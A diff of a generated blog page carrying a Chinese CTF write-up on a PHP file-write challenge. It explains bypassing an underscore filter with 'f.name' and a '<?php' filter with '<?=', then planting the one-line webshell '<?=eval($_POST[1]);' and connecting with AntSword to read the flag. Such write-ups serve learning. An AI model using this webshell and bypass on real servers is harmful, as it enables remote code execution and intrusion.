@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title> sunset</title>
+      <title>disable_function |  sunset</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -64,17 +64,27 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-CTF/disable_function"
+  id="post-disable_function"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  disable_function
+</h1>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2023/01/18/CTF/disable_function/" class="article-date">
-  <time datetime="2023-01-18T06:53:42.500Z" itemprop="datePublished">2023-01-18</time>
+      <a href="/2023/04/12/disable_function/" class="article-date">
+  <time datetime="2023-04-12T12:17:57.000Z" itemprop="datePublished">2023-04-12</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
@@ -111,7 +121,10 @@
 <p><img src="https://cdn.jsdelivr.net/gh/sunsetdream/future/disable_function.png"></p>
 <p>先从前面看起</p>
 <p><code>$query = urldecode($_SERVER[&quot;QUERY_STRING&quot;]);</code> 这部分是从给赋值的？开始往后面取值</p>
-<p>例如: <a target="_blank" rel="noopener" href="http://124.220.165.133:9909/?qusomn2655">http://124.220.165.133:9909/?qusomn2655</a>  则query=qusomn2655</p>
+<p>例如: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.220.165.133:9909/?qusomn2655</span><br></pre></td></tr></table></figure>
+
+<p>  则query=qusomn2655</p>
 <p><code>if (strpos($query, &#39;_&#39;) !== False)    die(&quot;nononono!&quot;);</code> strpos函数的意思是，从query中查找字符 _  ，如果没有找到，则返回False，因此这个部分过滤了 _ </p>
 <p>由于后面要给f_name赋值，可以用  .   来代替  _  即 f.name</p>
 <p><code>if (preg_match(&#39;/&lt;\?ph.|flag/i&#39;, $content) !== 0)</code>接下来看到正则表达式的位置，这个位置代表了过滤了content中的&lt;?ph 和flag字符，可以用&lt;?= 来代替&lt;?php。&lt;?= 是&lt;?=php echo 的简写</p>
@@ -121,7 +134,9 @@
 <p><code>file_put_contents($path, $content)</code>file_put_contents表示写入函数，path表示写入的文件名称，content表示写入文件的内容</p>
 <p>我们需要向服务器中写入一个php文件，在php文件里面写入可执行的木马，使其能够获取到其他文件的信息</p>
 <p>构造 GET参数:  ?f.name=7894.php  POST: f_content=&lt;?=eval($_POST[1]);  传入一句话木马</p>
-<p>然后将网页跳转到7894.php文件中   <a target="_blank" rel="noopener" href="http://124.220.165.133:9909/7894.php">http://124.220.165.133:9909/7894.php</a></p>
+<p>然后将网页跳转到7894.php文件中   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.220.165.133:9909/7894.php</span><br></pre></td></tr></table></figure>
+
 <p>用剑蚁连接一下  flag就在里面</p>
  
       <!-- reward -->
@@ -193,7 +208,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/01/18/CTF/disable_function/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/04/12/disable_function/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -204,19 +219,10 @@
    
   <nav class="article-nav">
     
+    
       <a href="/2023/04/12/future/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            future
-          
-        </div>
-      </a>
-    
-    
-      <a href="/2023/01/16/CTF/web/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title"></div>
+        <div class="article-nav-title">future</div>
       </a>
     
   </nav>
